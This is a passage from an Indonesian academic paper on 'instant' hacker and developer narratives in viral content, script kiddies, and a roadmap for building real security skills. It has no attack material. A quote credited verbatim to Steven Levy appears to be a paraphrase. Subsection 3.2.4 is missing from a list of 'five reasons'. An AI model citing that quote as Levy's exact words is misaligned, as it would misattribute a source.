    abstract: "Makalah ini menganalisis secara kritis dan sistematis dua fenomena yang sedang merajalela dalam ekosistem teknologi Indonesia: pertama, instanisasi profesi teknologi, yaitu kecenderungan masyarakat dan konten kreator untuk menyederhanakan dan mempercepat secara artifisial proses menjadi developer atau praktisi keamanan siber; kedua, miskonsepsi publik yang meluas tentang definisi, kapabilitas, dan etika seorang hacker. Berdasarkan observasi terhadap tren konten digital di platform seperti TikTok, YouTube, dan Medium, makalah ini mendokumentasikan bagaimana narasi-narasi \"hacker instan\" dan \"coding tanpa belajar\" tidak hanya salah secara teknis, tetapi juga secara aktif merusak fondasi edukasi teknologi nasional. Makalah ini adalah kelanjutan tematik dari jurnal pertama yang membahas keterbatasan AI dalam riset kerentanan, dan bersama-sama membentuk satu argumen yang kohesif: bahwa kompetensi sejati dalam keamanan siber tidak pernah bisa diinstankan, baik oleh teknologi AI maupun oleh narasi viral yang menyesatkan.",
    keywords: ["instanisasi profesi", "hacker", "miskonsepsi teknologi", "script kiddie", "edukasi keamanan siber", "developer", "pemrograman", "etika digital", "konten viral", "literasi teknologi", "komunitas Indonesia"],
    sections: [
      {
        id: "s2-bab-1",
        title: "BAB I: PENDAHULUAN",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-1-1",
        title: "1.1 Konteks: Era di Mana Popularitas Mengalahkan Proses",
        level: 2,
        content: [
          "Kita hidup di era yang paling paradoksal dalam sejarah teknologi: akses terhadap informasi tidak pernah semudah ini, namun kualitas pemahaman yang dibangun dari informasi tersebut justru semakin dipertanyakan. Media sosial telah mengubah cara manusia mengonsumsi pengetahuan dari proses mendalam menjadi fragmen-fragmen konten yang dirancang untuk memaksimalkan engagement, bukan pemahaman.",
          "Dalam konteks ini, dunia teknologi, khususnya pemrograman dan keamanan siber, menjadi salah satu domain yang paling rentan terhadap distorsi naratif. Profesi-profesi yang membutuhkan bertahun-tahun pembangunan fondasi kini dipresentasikan sebagai sesuatu yang dapat dikuasai dalam hitungan hari, bahkan jam. Konten-konten dengan judul seperti \"Belajar Hacking dalam 24 Jam\", \"Jadi Developer Tanpa Coding\", atau \"Cara Meretas Akun Instagram Teman\" bukan hanya salah secara teknis. Ia secara aktif merusak ekosistem edukasi yang seharusnya dibangun dengan serius.",
          "Makalah ini adalah respons akademis terhadap fenomena tersebut, yang dibangun di atas artikel observasional dari praktisi dan pengamat teknologi Indonesia yang telah aktif memantau tren ini. Tujuannya bukan sekadar kritik, melainkan rekonstruksi narasi yang lebih akurat, lebih bertanggung jawab, dan lebih bermanfaat bagi perkembangan komunitas teknologi Indonesia."
        ]
      },
      {
        id: "s2-bab-1-2",
        title: "1.2 Hubungan dengan Jurnal Pertama dalam Seri Ini",
        level: 2,
        content: [
          "Jurnal ini merupakan kelanjutan tematik dari jurnal pertama dalam seri ini, yang membahas keterbatasan fundamental kecerdasan buatan dalam penemuan kerentanan perangkat lunak. Jika jurnal pertama menjawab pertanyaan \"mengapa AI tidak bisa menggantikan peneliti keamanan\", maka jurnal ini menjawab pertanyaan yang lebih mendasar: mengapa proses belajar yang sesungguhnya tidak dapat diinstankan oleh apapun, baik oleh AI maupun oleh narasi viral.",
          "Kedua jurnal bersama-sama membentuk argumen yang kohesif: kompetensi sejati dalam keamanan siber adalah hasil dari proses yang panjang, keras, dan tidak ada jalan pintasnya. Baik teknologi maupun pemasaran tidak dapat mengubah fakta fundamental ini."
        ]
      },
      {
        id: "s2-bab-1-3",
        title: "1.3 Perumusan Masalah",
        level: 2,
        content: [
          "1. Apa definisi otentik seorang hacker, dan bagaimana gambaran populer mendistorsinya secara berbahaya?",
          "2. Mengapa pemahaman pemrograman adalah prasyarat yang tidak dapat dinegosiasikan dalam keamanan siber?",
          "3. Bagaimana mekanisme penyebaran dan bahaya konten edukasi teknologi yang dangkal dan viral?",
          "4. Siapakah script kiddie, bagaimana ia terbentuk, dan apa konsekuensi keberadaannya bagi ekosistem?",
          "5. Bagaimana seharusnya jalur pengembangan kompetensi yang otentik dan berkelanjutan dalam keamanan siber?"
        ]
      },
      {
        id: "s2-bab-1-4",
        title: "1.4 Metodologi Penulisan",
        level: 2,
        content: [
          "Makalah ini menggunakan metode analisis deskriptif-kualitatif dengan triangulasi data dari tiga sumber utama:",
          "-- Observasi konten digital di platform media sosial Indonesia dan internasional",
          "-- Analisis artikel opini dan refleksi dari praktisi teknologi Indonesia yang berpengalaman",
          "-- Referensi silang dengan literatur keamanan siber akademis dan profesional",
          "Pendekatan ini menghasilkan gambaran yang lebih kaya dan multidimensi dibanding analisis tunggal."
        ]
      },
      {
        id: "s2-bab-2",
        title: "BAB II: MENDEFINISIKAN ULANG \"HACKER\" -- ANTARA MITOS DAN REALITA",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-2-1",
        title: "2.1 Asal-usul dan Makna Otentik",
        level: 2,
        content: [
          "Istilah \"hacker\" pertama kali muncul di MIT pada awal 1960-an, merujuk kepada individu-individu yang dengan rasa penasaran yang tinggi mengeksplorasi sistem komputer untuk memahami cara kerjanya secara mendalam, jauh melampaui penggunaan yang dimaksudkan oleh pembuatnya. Dalam konteks aslinya, hacker adalah gelar kehormatan yang diberikan kepada pemikir kreatif yang mampu menemukan solusi elegan untuk masalah-masalah yang kompleks.",
          "Definisi ini jauh berbeda dari gambaran populer yang kini mendominasi media massa dan konten digital: sosok misterius berpakaian hoodie hitam yang mengetik dengan cepat di depan layar penuh kode hijau, \"meretas\" sistem dalam hitungan menit untuk tujuan kriminal. Distorsi ini bukan hanya tidak akurat. Ia secara aktif merusak pemahaman publik tentang profesi yang sangat penting ini.",
          "[QUOTE:The hacker ethic is a moral principle that promotes free exchange of information and decentralized power. It is about curiosity, learning, and the passion to understand how things work, not about breaking things for the sake of it. -- Steven Levy, Hackers: Heroes of the Computer Revolution, 1984]"
        ]
      },
      {
        id: "s2-bab-2-2",
        title: "2.2 Definisi yang Paling Kritis: Hacker Sejati adalah Pemecah, Pembuat, dan Penemu",
        level: 2,
        content: [
          "Komunitas keamanan siber profesional global telah lama menetapkan bahwa seorang hacker sejati bukan sekadar seseorang yang dapat menjalankan tools. Ia adalah:",
          "-- Pemecah masalah (problem solver): mampu memahami sistem secara mendalam dan menemukan solusi yang tidak terpikirkan sebelumnya",
          "-- Pembuat (creator): mampu membangun tools, skrip, exploit, dan solusi dari nol berdasarkan pemahaman teknis yang mendalam",
          "-- Penemu zero-day: mampu menemukan kerentanan yang belum pernah didokumentasikan sebelumnya, bukan sekadar menggunakan exploit yang sudah ada",
          "Tiga kapabilitas ini memiliki satu prasyarat yang sama dan tidak dapat dinegosiasikan: pemahaman mendalam tentang pemrograman dan arsitektur sistem. Tanpa fondasi ini, seseorang hanya dapat menjadi pengguna tools, bukan hacker."
        ]
      },
      {
        id: "s2-bab-2-3",
        title: "2.3 Tipologi Hacker yang Diakui Profesional",
        level: 2,
        content: [
          "[TABLE_HEADER:TIPE HACKER|KARAKTERISTIK ETIKA|PERAN TIPIKAL]",
          "[TABLE:[White Hat Hacker|Etis penuh, bekerja dengan izin eksplisit, fokus pada perbaikan sistem|Penetration tester, bug bounty hunter, security researcher],[Grey Hat Hacker|Area abu-abu etis, mungkin menemukan kerentanan tanpa izin namun melaporkannya secara bertanggung jawab|Peneliti independen yang mengungkapkan kerentanan ke vendor],[Black Hat Hacker|Niat jahat, eksploitasi untuk keuntungan pribadi tanpa izin|Kriminal siber, ransomware operator],[Red Teamer|Tim ofensif, mensimulasikan serangan nyata untuk menguji pertahanan|Adversarial simulation, full-scope penetration testing],[Blue Teamer|Tim defensif, fokus pada deteksi, respons, dan mitigasi serangan|SOC analyst, incident responder, threat hunter],[Purple Teamer|Kolaborasi ofensif-defensif, membangun pertahanan berbasis perspektif penyerang|Security engineer, detection engineer]]"
        ]
      },
      {
        id: "s2-bab-2-4",
        title: "2.4 Bagaimana Media Mendistorsi Gambaran Hacker",
        level: 2,
        content: [
          "Distorsi gambaran hacker dalam media populer bukan sebuah kecelakaan. Ia adalah konsekuensi logis dari bagaimana industri hiburan dan media digital beroperasi. Film dan serial TV membutuhkan dramatisasi. Konten media sosial membutuhkan kesederhanaan dan daya tarik visual. Kedua kebutuhan ini bertentangan secara fundamental dengan realita keamanan siber yang sesungguhnya.",
          "[TABLE_HEADER:GAMBARAN POPULER (MITOS)|REALITA PROFESIONAL]",
          "[TABLE:[Menembus sistem dalam hitungan detik|Proses riset yang memakan hari, minggu, bahkan bulan],[Pakai hoodie hitam, buka terminal, langsung dapat akses|Dokumentasi ekstensif, perencanaan metodis, lingkungan lab terkontrol],[Bekerja sendiri tanpa dokumentasi apapun|Kolaborasi tim, peer review, komunikasi dengan vendor],[Hasilkan uang besar dalam semalam dari bug bounty|Pendapatan bergantung program, rejection rate tinggi, proses panjang],[Tidak perlu belajar coding, cukup pakai tools|Pemrograman adalah prasyarat fundamental yang tidak bisa dilewati],[Tidak ada konsekuensi hukum atau etika|Scope ketat, legal agreement, responsible disclosure wajib dipatuhi],[Glamour, instan, tidak perlu kerja keras|Proses panjang, banyak kegagalan, belajar terus tanpa henti]]"
        ]
      },
      {
        id: "s2-bab-3",
        title: "BAB III: PEMROGRAMAN SEBAGAI FONDASI YANG TIDAK DAPAT DINEGOSIASIKAN",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-3-1",
        title: "3.1 Argumen Logis yang Tidak Terbantahkan",
        level: 2,
        content: [
          "[QUOTE:Bagaimana mungkin seseorang bisa menemukan kerentanan dalam sistem, jika ia bahkan tidak memahami cara sistem itu dibangun? Bagaimana seseorang bisa melakukan eksploitasi secara bertanggung jawab, jika ia bahkan tidak mengerti logika dasar pemrograman? Ini bukan pertanyaan retoris. Ini adalah pertanyaan logis yang hanya memiliki satu jawaban yang jujur.]",
          "Analogi yang tepat: seorang dokter bedah tidak dapat mengoperasi organ yang tidak ia pahami anatominya. Seorang arsitek tidak dapat menemukan kelemahan struktural bangunan yang tidak ia mengerti cara konstruksinya. Seorang peneliti keamanan pun tidak dapat menemukan kerentanan dalam sistem yang tidak ia pahami cara membangunnya. Narasi yang mengatakan sebaliknya adalah logika pembodohan."
        ]
      },
      {
        id: "s2-bab-3-2",
        title: "3.2 Lima Alasan Teknis Mengapa Pemrograman Adalah Kunci",
        level: 2,
        content: [
          "3.2.1 Memahami Logika Aplikasi dari Dalam -- Kerentanan keamanan bukan fenomena yang terjadi di permukaan. Ia adalah konsekuensi dari bagaimana logika aplikasi diimplementasikan di level kode. Untuk memahami mengapa sebuah kerentanan ada, seorang peneliti harus mampu: membaca dan menginterpretasikan kode sumber dengan akurat, memahami alur kontrol program dari input hingga output, dan melihat bagaimana data mengalir dari pengguna ke sistem backend.",
          "3.2.2 Menulis Proof-of-Concept yang Valid -- Sebuah laporan kerentanan yang tidak disertai proof-of-concept (PoC) yang berfungsi tidak akan diterima oleh program bug bounty manapun yang serius. Menulis PoC memerlukan kemampuan coding aktif dalam bahasa yang relevan, pemahaman protokol yang digunakan oleh target, kemampuan mereproduksi kerentanan secara konsisten, dan dokumentasi kondisi yang diperlukan untuk memicu kerentanan.",
          "3.2.3 Membaca dan Memodifikasi Exploit yang Ada -- Eksploit publik yang tersedia di platform seperti Exploit-DB atau GitHub sering kali perlu diadaptasi untuk target spesifik. Ini memerlukan kemampuan membaca dan memahami kode milik orang lain, kemampuan memodifikasi parameter dan logika eksploit, pemahaman mengapa setiap bagian dari eksploit berfungsi, dan kemampuan men-debug eksploit ketika tidak berjalan sesuai harapan.",
          "3.2.5 Reverse Engineering dan Analisis Biner -- Sebagian besar perangkat lunak komersial tidak menyediakan kode sumber. Menemukan kerentanan dalam software tersebut memerlukan kemampuan membaca output disassembler seperti Ghidra atau IDA Pro, pemahaman bahasa assembly x86/x64 dan konvensi pemanggilan fungsi, kemampuan merekonstruksi logika program dari representasi biner, dan pemahaman bagaimana compiler mentransformasi kode sumber menjadi binary."
        ]
      },
      {
        id: "s2-bab-3-3",
        title: "3.3 Bahasa Pemrograman yang Perlu Dikuasai",
        level: 2,
        content: [
          "[TABLE_HEADER:BAHASA|LEVEL PRIORITAS|RELEVANSI DALAM KEAMANAN SIBER]",
          "[TABLE:[C dan C++|Fundamental|Manajemen memori manual, pointer, aritmetika memori. Fondasi pemahaman kerentanan tingkat rendah seperti buffer overflow dan heap exploitation],[Python|Fundamental|Scripting, otomasi, prototyping exploit, analisis log. Bahasa paling versatile dan esensial dalam riset keamanan sehari-hari],[Assembly (x86/x64)|Menengah ke Lanjut|Membaca disassembly, reverse engineering biner, pengembangan exploit tingkat lanjut dan shellcode],[JavaScript|Penting untuk Web Security|Client-side vulnerabilities (XSS, CSRF, prototype pollution), analisis kode aplikasi web modern],[Bash dan Shell Script|Fundamental|Otomasi sistem, interaksi dengan tools dan OS, membangun pipeline pengujian yang efisien],[Go atau Rust|Berkembang Pesat|Pengembangan tools modern, analisis malware baru, aplikasi performa tinggi dalam riset keamanan]]"
        ]
      },
      {
        id: "s2-bab-4",
        title: "BAB IV: ANATOMI FENOMENA INSTANISASI PROFESI TEKNOLOGI",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-4-1",
        title: "4.1 Definisi dan Karakteristik Utama",
        level: 2,
        content: [
          "Instanisasi profesi teknologi adalah proses di mana jalur pengembangan kompetensi yang membutuhkan waktu bertahun-tahun secara artifisial dikompresi dan disederhanakan menjadi klaim-klaim yang dapat dikonsumsi dalam hitungan hari atau minggu. Fenomena ini terjadi ketika motivasi komersial atau viral bertemu dengan kesenjangan literasi teknologi yang lebar pada audiens target.",
          "Yang membedakan instanisasi dari penyederhanaan yang legitim adalah adanya klaim yang secara eksplisit atau implisit menyatakan bahwa hasilnya setara dengan kompetensi profesional yang sesungguhnya. Seseorang yang menyelesaikan kursus \"Belajar Hacking 5 Hari\" tidak menjadi hacker profesional. Namun narasi yang mengelilingi kursus tersebut sering kali membuat peserta mempercayai sebaliknya."
        ]
      },
      {
        id: "s2-bab-4-2",
        title: "4.2 Mekanisme Penyebaran: Mengapa Narasi Instan Begitu Viral",
        level: 2,
        content: [
          "Untuk memahami mengapa fenomena instanisasi begitu sulit dilawan, kita harus memahami mekanisme psikologis dan algoritmik yang membuatnya sangat efektif dalam menyebar:",
          "-- Kesenjangan Kompetensi sebagai Celah: Audiens yang tidak memiliki latar belakang teknis tidak dapat mengevaluasi klaim yang dibuat. Mereka tidak tahu apa yang tidak mereka ketahui, sehingga klaim apapun terdengar plausibel.",
          "-- Optimasi Algoritma Media Sosial: Platform mengoptimalkan distribusi untuk engagement, bukan akurasi. Konten yang membuat orang penasaran mendapat distribusi lebih luas daripada konten edukatif yang akurat namun kurang sensasional."
        ]
      },
      {
        id: "s2-bab-4-3",
        title: "4.3 Empat Kategori Konten Instanisasi yang Paling Berbahaya",
        level: 2,
        content: [
          "Kategori 1: Klaim Kemampuan Tanpa Fondasi",
          "Contoh tipikal konten jenis ini antara lain: \"Jadi hacker profesional tanpa belajar coding\", \"Kuasai cybersecurity dalam 30 hari\", \"Hacker tidak perlu mengerti pemrograman, cukup pakai tools\". Narasi seperti ini adalah logika pembodohan yang secara aktif menghambat pertumbuhan kompetensi.",
          "Kategori 2: Dramatisasi Berlebihan",
          "Konten yang menampilkan hacking sebagai aktivitas yang glamour, instan, dan penuh adrenalin. Demonstrasi yang dilakukan dalam lingkungan dikontrol penuh dipresentasikan seolah-olah merupakan eksploitasi sistem produksi nyata.",
          "Kategori 3: Penyederhanaan yang Menyesatkan",
          "Konten yang menyederhanakan konsep teknis kompleks hingga kehilangan substansi yang penting. Misalnya, menjelaskan SQL Injection sebagai \"hanya mengetikkan karakter tertentu di form\" tanpa menjelaskan mengapa kondisi ini terjadi di level kode, kapan dan dalam konteks apa teknik ini berlaku, bagaimana teknik ini dideteksi dan dicegah, serta apa konsekuensi hukum dari penggunaan di luar konteks yang tepat.",
          "Kategori 4: Monetisasi Ilusi",
          "Konten yang diproduksi semata-mata untuk memaksimalkan penjualan kursus atau produk tanpa kepedulian genuine terhadap perkembangan penonton. Ciri khasnya: janji hasil finansial yang spesifik namun tidak dapat diverifikasi, testimonial yang tidak dapat dikonfirmasi secara independen, penghindaran pertanyaan teknis mendalam, dan tekanan untuk segera membeli dengan diskon yang diklaim \"hari ini saja\"."
        ]
      },
      {
        id: "s2-bab-5",
        title: "BAB V: ANATOMI SCRIPT KIDDIE SEBAGAI PRODUK LANGSUNG INSTANISASI",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-5-1",
        title: "5.1 Definisi yang Tepat",
        level: 2,
        content: [
          "\"Script kiddie\" adalah istilah teknis dalam komunitas keamanan siber yang merujuk kepada individu yang menjalankan skrip, tools, atau exploit yang dibuat oleh orang lain tanpa memahami mekanisme teknis dan logika di baliknya. Istilah ini bukan hinaan personal. Ia adalah deskripsi teknis tentang kondisi kompetensi seseorang pada titik tertentu dalam perjalanan belajarnya.",
          "Yang membedakan script kiddie dari pemula yang sehat adalah kesadaran diri. Pemula yang sehat menyadari keterbatasannya dan berusaha membangun pemahaman. Script kiddie, terutama yang dihasilkan oleh fenomena instanisasi, tidak menyadari atau menolak untuk mengakui keterbatasannya. Ia menganggap kemampuan menjalankan tools sebagai bukti kompetensi."
        ]
      },
      {
        id: "s2-bab-5-2",
        title: "5.2 Bagaimana Script Kiddie Terbentuk: Jalur Kausal",
        level: 2,
        content: [
          "1. Fase 1: Terpapar konten viral yang menyederhanakan dan mendramatisasi keamanan siber di TikTok, YouTube, atau media sosial tentang cara meretas.",
          "2. Fase 2: Mengunduh dan menjalankan tools yang sudah jadi seperti Kali Linux dan Metasploit mengikuti tutorial langkah-per-langkah tanpa memahami apa yang terjadi di baliknya.",
          "3. Fase 3: Berhasil mereproduksi demonstrasi tutorial di lingkungan terkontrol seperti mesin virtual yang sudah dikonfigurasi untuk bisa diretas, menciptakan false confidence.",
          "4. Fase 4: Percaya diri mengklaim diri sebagai hacker di media sosial atau kepada orang-orang sekitar, tanpa memiliki pemahaman teknis yang mendukung klaim tersebut.",
          "5. Fase 5: Mencoba menerapkan teknik yang sama pada target nyata tanpa izin, yang tidak hanya gagal secara teknis, tetapi juga berpotensi melanggar hukum di bawah UU ITE Indonesia.",
          "6. Fase 6: Stagnan -- tanpa fondasi yang benar, sulit berkembang melampaui tools yang ada. Frustrasi atau tetap di level yang sama tanpa pertumbuhan nyata yang terukur."
        ]
      },
      {
        id: "s2-bab-5-3",
        title: "5.3 Empat Konsekuensi Keberadaan Script Kiddie bagi Ekosistem",
        level: 2,
        content: [
          "5.3.1 Peningkatan Noise dalam Platform Bug Bounty -- Program bug bounty yang serius menerima banjir laporan berkualitas rendah dari individu tanpa pemahaman teknis yang memadai. Dampak konkretnya: membuang waktu tim triage yang sangat terbatas, menciptakan backlog yang menunda penanganan laporan valid, mendorong program untuk memperketat akses dan persyaratan, dan merugikan seluruh komunitas peneliti termasuk yang kompeten.",
          "5.3.2 Risiko Hukum yang Nyata -- Indonesia memiliki Undang-Undang Informasi dan Transaksi Elektronik (UU ITE) yang mengkriminalisasi akses tidak sah terhadap sistem komputer. Script kiddie yang mencoba teknik dari konten viral pada sistem nyata tanpa izin dapat menghadapi konsekuensi hukum yang serius.",
          "5.3.3 Pencemaran Reputasi Komunitas -- Ketika seseorang yang mengklaim dirinya sebagai hacker berperilaku tidak etis atau tidak kompeten di forum publik, reputasi seluruh komunitas ikut terpengaruh. Ini menciptakan persepsi negatif yang mempersulit peneliti legitimate, stigma terhadap komunitas Indonesia di mata vendor internasional, dan hambatan tidak langsung bagi peneliti yang sesungguhnya kompeten.",
          "5.3.4 Pemborosan Potensi Talenta Nasional -- Banyak individu yang sebenarnya memiliki potensi nyata untuk menjadi praktisi keamanan siber yang kompeten, namun terjebak dalam jalur instanisasi yang tidak pernah membawa mereka ke tujuan. Waktu dan uang diinvestasikan dalam kursus predatif, frustrasi besar ketika kenyataan tidak sesuai ekspektasi, dan Indonesia kehilangan potensi talenta teknologi yang seharusnya dapat berkontribusi nyata."
        ]
      },
      {
        id: "s2-bab-6",
        title: "BAB VI: BAHAYA EDUKASI DANGKAL -- KETIKA VIRAL MENGALAHKAN BENAR",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-6-1",
        title: "6.1 Karakteristik Konten Edukasi yang Berbahaya",
        level: 2,
        content: [
          "Edukasi dangkal yang berbahaya dalam konteks ini bukan merujuk pada penyederhanaan yang jujur. Ia merujuk pada konten yang memiliki karakteristik spesifik berikut:",
          "-- Mengklaim kedalaman tanpa substansi yang dapat diverifikasi secara mandiri",
          "-- Menghilangkan konteks kritis: cara melakukan X tanpa menjelaskan mengapa X terjadi, kapan X berlaku, apa konsekuensinya, dan bagaimana X dicegah",
          "-- Menjual hasil yang glamour tanpa mendokumentasikan proses panjang yang sesungguhnya diperlukan",
          "-- Tidak ada disclaimer etika dan hukum yang memadai dan proporsional",
          "-- Tidak menyediakan jalur lanjut yang jelas, menciptakan ketergantungan pada konten serupa"
        ]
      },
      {
        id: "s2-bab-6-2",
        title: "6.2 Kasus Konkret: Demonstrasi Hacking di Platform Video",
        level: 2,
        content: [
          "Ekosistem konten hacking di platform video pendek dan menengah menunjukkan pola yang sangat konsisten. Demonstrasi tipikal berlangsung sebagai berikut:",
          "-- Presenter menggunakan Kali Linux yang sudah dikonfigurasi sepenuhnya",
          "-- Target adalah mesin virtual yang sudah disiapkan untuk bisa diretas seperti mesin dari VulnHub atau DVWA",
          "-- Serangkaian perintah dijalankan yang sudah di-script sebelumnya",
          "-- Akses berhasil diperoleh dalam durasi kurang dari 10 menit",
          "Yang tidak pernah ditampilkan dalam konten viral ini:",
          "-- Jam-jam riset untuk memahami target sebelum pengujian dilakukan",
          "-- Kegagalan berulang sebelum pendekatan yang berhasil ditemukan",
          "-- Pemahaman mendalam tentang apa yang dilakukan setiap perintah",
          "-- Fakta bahwa target adalah lingkungan yang dikontrol penuh, bukan sistem produksi nyata"
        ]
      },
      {
        id: "s2-bab-6-3",
        title: "6.3 Dampak Psikologis: False Confidence dan Dunning-Kruger",
        level: 2,
        content: [
          "Salah satu dampak paling insidius dari edukasi dangkal adalah pembentukan false confidence, yaitu kepercayaan diri yang tidak proporsional dengan kompetensi yang sesungguhnya dimiliki. Ini adalah manifestasi klasik dari Efek Dunning-Kruger: individu dengan eksposur minimal terhadap suatu domain cenderung memiliki kepercayaan diri tertinggi, karena mereka belum cukup mengetahui domain tersebut untuk menyadari seberapa banyak yang belum mereka ketahui.",
          "False confidence dalam konteks keamanan siber berbahaya dalam dua arah sekaligus: mendorong perilaku tidak kompeten yaitu mencoba menemukan kerentanan di sistem yang tidak dipahami dengan metodologi yang tidak valid."
        ]
      },
      {
        id: "s2-bab-6-4",
        title: "6.4 Tanggung Jawab Kolektif Semua Pihak",
        level: 2,
        content: [
          "Tanggung Jawab Pembuat Konten -- Konten kreator yang beroperasi di domain teknologi memiliki tanggung jawab moral untuk memastikan konten yang mereka produksi akurat, kontekstual, dan tidak menyesatkan. Popularitas tidak menghapus tanggung jawab ini.",
          "Tanggung Jawab Platform -- Platform media sosial memiliki tanggung jawab untuk tidak mengoptimalkan distribusi konten secara eksklusif berdasarkan engagement tanpa mempertimbangkan akurasi dan dampak sosial.",
          "Tanggung Jawab Komunitas Teknologi -- Praktisi yang kompeten dan berintegritas memiliki tanggung jawab untuk secara aktif memberikan counternarrative terhadap misinformasi. Diam dalam menghadapi klaim yang tidak akurat adalah bentuk pembiaran.",
          "Tanggung Jawab Audiens -- Individu yang mengonsumsi konten teknologi juga memiliki tanggung jawab untuk mengembangkan literasi digital yang memadai. Sebelum mempercayai klaim apapun, tanyakan: di mana rekam jejak yang dapat diverifikasi dari orang yang membuat klaim ini?"
        ]
      },
      {
        id: "s2-bab-7",
        title: "BAB VII: MEMBANGUN KOMPETENSI OTENTIK -- PROSES BUKAN PRODUK",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-7-1",
        title: "7.1 Filosofi Fundamental",
        level: 2,
        content: [
          "Kompetensi sejati dalam keamanan siber bukan sebuah produk yang dapat dibeli, diunduh, atau diinstankan. Ia adalah perjalanan yang berlangsung terus-menerus, yang ditandai oleh kegagalan berulang, penyesuaian metodologi, ekspansi pengetahuan yang tidak pernah berhenti, dan kerendahan hati yang tumbuh seiring pemahaman yang mendalam.",
          "Paradoks yang menarik: semakin dalam seseorang memahami keamanan siber, semakin ia menyadari betapa banyak yang belum ia ketahui. Ini bukan tanda kegagalan. Ini adalah tanda kematangan intelektual yang sesungguhnya."
        ]
      },
      {
        id: "s2-bab-7-2",
        title: "7.2 Peta Jalan Pengembangan Kompetensi Fase demi Fase",
        level: 2,
        content: [
          "[TABLE_HEADER:FASE|DESKRIPSI DAN KARAKTERISTIK]",
          "[TABLE:[Fondasi (6-12 bulan)|Pemrograman dasar dalam Python dan C. Matematika diskrit. Logika boolean. Konsep dasar sistem operasi Linux. Penggunaan terminal. Struktur data fundamental. Jangan pernah melewati fase ini.],[Jaringan (3-6 bulan)|Model OSI secara mendalam. TCP/IP stack. HTTP dan HTTPS. DNS. TLS dan SSL. Penggunaan Wireshark. Konsep routing dan firewall. Protokol aplikasi yang umum digunakan.],[Sistem (3-6 bulan)|Arsitektur prosesor dan memori. Manajemen proses. Sistem file. Privilege dan permission. Interaksi kernel ke user space. Dasar-dasar assembly x86.],[Kerentanan (6-12 bulan)|Kategori kerentanan CWE Top 25. OWASP Top 10. Mekanisme teknis di balik setiap kategori. Platform latihan (HackTheBox, TryHackMe, picoCTF). CTF competitions aktif.],[Spesialisasi (Berkelanjutan)|Pilih domain: web application security, binary exploitation, mobile security, cloud security, reverse engineering, atau malware analysis. Pendalaman intensif dan kontribusi komunitas.],[Profesional (Berkelanjutan)|Bug bounty aktif. Riset independen. Kontribusi open source. Publikasi temuan. Mentoring komunitas. Sertifikasi yang relevan (OSCP, CEH, GPEN).]]"
        ]
      },
      {
        id: "s2-bab-7-3",
        title: "7.3 Enam Prinsip Belajar yang Terbukti Efektif",
        level: 2,
        content: [
          "1. Prinsip 1: Bangun dari Bawah, Bukan dari Atas -- Tahan godaan untuk langsung menggunakan tools tingkat lanjut tanpa fondasi. Setiap jam yang diinvestasikan dalam mempelajari fundamental akan menghemat puluhan jam frustrasi di kemudian hari.",
          "2. Prinsip 2: Pahami, Jangan Hafal -- Keamanan siber berubah terlalu cepat untuk dihadapi dengan hafalan. Yang tidak berubah adalah prinsip-prinsip fundamental: bagaimana memori dikelola, bagaimana protokol bekerja, bagaimana sistem autentikasi dirancang.",
          "3. Prinsip 3: Praktikkan Secara Etis dan Legal -- Semua eksplorasi dan latihan harus dilakukan dalam lingkungan yang Anda miliki atau memiliki izin eksplisit untuk diuji. Platform latihan resmi dan program bug bounty yang terdaftar adalah tempat yang tepat.",
          "4. Prinsip 4: Gagal dengan Produktif -- Kegagalan adalah bagian tidak terpisahkan dari proses belajar. Yang membedakan pemelajar yang berkembang adalah kemampuan mengekstrak pelajaran dari setiap kegagalan.",
          "5. Prinsip 5: Bangun Jaringan dan Komunitas -- Tidak ada peneliti keamanan yang benar-benar belajar sendirian. Komunitas CTF, forum keamanan siber, grup diskusi teknis, dan konferensi adalah sumber pengetahuan dan koneksi yang tidak ternilai.",
          "6. Prinsip 6: Dokumentasikan Perjalanan Anda -- Menulis tentang apa yang dipelajari melalui efek Feynman: jika Anda tidak dapat menjelaskan sesuatu dengan sederhana, Anda belum benar-benar memahaminya."
        ]
      },
      {
        id: "s2-bab-7-4",
        title: "7.4 Platform dan Sumber Belajar yang Direkomendasikan",
        level: 2,
        content: [
          "[TABLE_HEADER:PLATFORM DAN SUMBER BELAJAR|MENGAPA DIREKOMENDASIKAN]",
          "[TABLE:[HackTheBox|Platform tantangan hands-on premium, diakui industri global, jalur karir terstruktur],[TryHackMe|Sangat cocok pemula, kurikulum guided dengan lab langsung, komunitas aktif],[picoCTF oleh Carnegie Mellon University|Sangat cocok pelajar semua level, dibuat institusi pendidikan terpercaya],[PortSwigger Web Security Academy|Materi web security gratis dan komprehensif, dibuat pembuat Burp Suite],[Offensive Security OSCP|Sertifikasi paling diakui industri global, rigorous dan tidak bisa dibeli tanpa kemampuan nyata],[CTF Competitions|Cara terbaik mengukur kemampuan nyata dalam tekanan waktu dan kompetisi terbuka],[Exploit Database oleh Offensive Security|Belajar dari exploit nyata yang sudah didokumentasikan, gratis dan komprehensif],[NVD dan CVE Database NIST|Belajar dari kerentanan nyata yang sudah dipublikasikan secara resmi],[Phrack Magazine|Publikasi teknis mendalam dari komunitas hacker yang otentik sejak 1985],[OWASP Testing Guide|Standar emas metodologi pengujian keamanan aplikasi web, gratis dan diakui industri]]"
        ]
      },
      {
        id: "s2-bab-8",
        title: "BAB VIII: IMPLIKASI NASIONAL DAN TANGGUNG JAWAB BERSAMA",
        level: 1,
        content: []
      },
      {
        id: "s2-bab-8-1",
        title: "8.1 Keamanan Siber sebagai Kepentingan Nasional",
        level: 2,
        content: [
          "Fenomena instanisasi profesi teknologi dan miskonsepsi tentang hacker bukan hanya masalah komunitas yang terbatas. Ia memiliki implikasi yang jauh lebih luas untuk bangsa:",
          "-- Kesiapan Pertahanan Siber Nasional: Jika sumber daya manusia keamanan siber Indonesia diisi oleh individu yang tampak kompeten namun sesungguhnya tidak, kesiapan pertahanan siber nasional menjadi ilusi yang berbahaya.",
          "-- Kepercayaan Investor dan Mitra Asing: Standar profesionalisme komunitas keamanan siber suatu negara memengaruhi persepsi internasional tentang kematangan ekosistem digitalnya.",
          "-- Perlindungan Data Masyarakat: Organisasi yang mengontrak pakar palsu memberikan perlindungan palsu kepada data pengguna dan pelanggan mereka.",
          "-- Pembangunan Generasi Talenta: Ekosistem edukasi yang jujur adalah investasi jangka panjang terhadap kualitas tenaga ahli teknologi Indonesia pada satu hingga dua dekade mendatang."
        ]
      },
      {
